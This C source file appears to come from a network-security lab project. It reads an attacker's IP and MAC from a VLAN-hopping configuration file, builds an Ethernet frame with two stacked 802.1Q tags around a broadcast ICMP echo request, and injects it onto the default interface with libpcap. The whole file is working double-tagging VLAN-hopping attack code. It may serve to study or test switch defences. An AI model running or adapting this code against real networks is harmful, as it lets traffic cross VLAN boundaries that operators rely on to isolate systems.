#include "../../Defence/ip_headers.h"
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include "../includes/lib_attack.h"
#include <pcap.h>

#define ICMP_PACKET_SIZE 64

struct icmp_packet {
    struct icmp_header icmp_hdr;
    u_char msg[ICMP_PACKET_SIZE - sizeof(struct icmp_header)];
};


int main(int argc, char const *argv[]) {
    /**************************************************************/
    
    FILE *file = fopen("./VLAN-Hopping/vlan_hopping_configuration.conf", "r");
    char sourceIP[16];
    char sourceMAC[18];
    unsigned char mac[6];
    char buff[50];
    
    for(int i = 0; i < 8; i++){
        fscanf(file, "%s", buff);
    }
    
    strcpy(sourceIP, buff);
    printf("Source IP: %s\n", sourceIP);
    
    for(int i = 0; i <8 ; i++){
        fscanf(file,"%s",buff);
    }

    strcpy(sourceMAC, buff);
    sscanf(sourceMAC, "%x:%x:%x:%x:%x:%x", mac + 0, mac + 1, mac + 2, mac + 3, mac + 4, mac + 5);
    printf("Source MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    fclose(file);

    /**************************************************************/
    
    int packet_size = sizeof(struct vlan_ethernet_header) + sizeof(struct ip_header) + sizeof(struct icmp_packet);
    
    u_char *packet = calloc(1, (size_t) packet_size);
    
    struct vlan_ethernet_header * eth_hdr = (struct vlan_ethernet_header *) packet;
    struct ip_header * ip_hdr = (struct ip_header *) (packet + sizeof(struct vlan_ethernet_header));
    struct icmp_packet * icmp_pck = (struct icmp_packet *) ((char *)ip_hdr + sizeof(struct ip_header));
    
    u_char tmp_dest_mac[ETHER_ADDR_LEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    
    memcpy((char *)eth_hdr->ether_dhost, (const char *)tmp_dest_mac, ETHER_ADDR_LEN);
    memcpy((char *)eth_hdr->ether_shost, (const char *)mac, ETHER_ADDR_LEN);
    
#ifndef DISABLE_VLAN
    eth_hdr->customer.tpid = htons(0x8100);	// 802.1Q
    eth_hdr->customer.pcp_vid = htons(1);
    
    eth_hdr->service.tpid = htons(0x8100);	// 802.1Q
    eth_hdr->service.pcp_vid = htons(100);
#endif
    
    eth_hdr->ether_type = htons(0x0800);	/* IP type */
    
    ip_hdr->ip_vhl = (u_char)0x45;  /* version 4, length 5*/
    ip_hdr->ip_tos = 0;
    ip_hdr->ip_len = htons(packet_size - sizeof(struct vlan_ethernet_header));
    ip_hdr->ip_id = htons(54321);
    ip_hdr->ip_off = 0;
    ip_hdr->ip_ttl = 255;
    ip_hdr->ip_p = 1;   /*ICMP protocol*/
    ip_hdr->ip_sum = 0;
    ip_hdr->ip_src.s_addr = inet_addr(sourceIP);
    ip_hdr->ip_dst.s_addr = inet_addr("255.255.255.255");
    
    printf("%d\n", ip_hdr->ip_len);
    
    ip_hdr->ip_sum = csum((unsigned short *) (packet + sizeof(struct vlan_ethernet_header)), ntohs(ip_hdr->ip_len) >> 1);
    
    icmp_pck->icmp_hdr.icmph_type = 8;   /* echo */
    icmp_pck->icmp_hdr.icmph_code = 0;
    icmp_pck->icmp_hdr.icmph_chksum = 0;
    icmp_pck->icmp_hdr.icmph_ident = 0;
    icmp_pck->icmp_hdr.icmph_seqnum = 0;
    strncpy(icmp_pck->msg, "Hello", ICMP_PACKET_SIZE - sizeof(struct icmp_header));
    
    icmp_pck->icmp_hdr.icmph_chksum = csum((unsigned short *) icmp_pck, sizeof(struct icmp_packet));
    
    // Open a PCAP packet capture descriptor for the specified interface.
    char *if_name=NULL;
    char pcap_errbuf[PCAP_ERRBUF_SIZE];
    pcap_errbuf[0]='\0';
    if_name=pcap_lookupdev(pcap_errbuf);

    //if_name = "wlp2s0.1.100";
    printf("Interface: %s\n",if_name);
    if (if_name == NULL) {
	fprintf(stderr, "Couldn't find default device: %s\n", pcap_errbuf);
	exit(EXIT_FAILURE);
    }
    pcap_t* pcap=pcap_open_live(if_name, SNAP_LEN, 1, 1000,pcap_errbuf);
    if (pcap_errbuf[0]!='\0') {
        fprintf(stderr,"asdasd %s\n",pcap_errbuf);
    }
    if (!pcap) {
        exit(1);
    }

    // Write the Ethernet frame to the interface.
    if (pcap_inject(pcap,packet,packet_size)==-1) {
        pcap_perror(pcap,0);
        pcap_close(pcap);
        exit(1);
    }

    // Close the PCAP descriptor.
    pcap_close(pcap);

    return 0;
}
